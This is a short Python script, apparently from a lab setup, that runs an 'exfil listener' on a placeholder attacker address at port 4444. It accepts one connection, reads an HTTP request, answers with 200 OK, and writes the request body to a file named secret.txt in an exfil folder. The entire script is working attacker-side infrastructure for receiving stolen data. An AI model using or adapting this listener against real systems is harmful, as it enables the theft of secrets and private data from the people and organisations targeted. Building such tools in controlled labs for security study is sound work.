import socket, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    s.bind(("ATTACKER_IP", 4444))
except OSError as e:
    print("BIND FAILED:", e, flush=True)
    raise SystemExit(1)
s.listen(1)
print("EXFIL LISTENER UP on ATTACKER_IP:4444", flush=True)

c, a = s.accept()
print("conn from", a, flush=True)
c.settimeout(60)
data = b""
try:
    while True:
        d = c.recv(65536)
        if not d:
            break
        data += d
except socket.timeout:
    pass
if b"\r\n\r\n" in data:
    body = data.split(b"\r\n\r\n", 1)[1]
else:
    body = data
try:
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK")
    print("HTTP 200 sent back", flush=True)
except OSError as e:
    print("send 200 failed:", e, flush=True)
c.close()

outdir = r"C:\Users\style\lab\exfil"
os.makedirs(outdir, exist_ok=True)
with open(os.path.join(outdir, "secret.txt"), "wb") as f:
    f.write(body)
print(f"EXFIL SAVED {len(body)} bytes", flush=True)
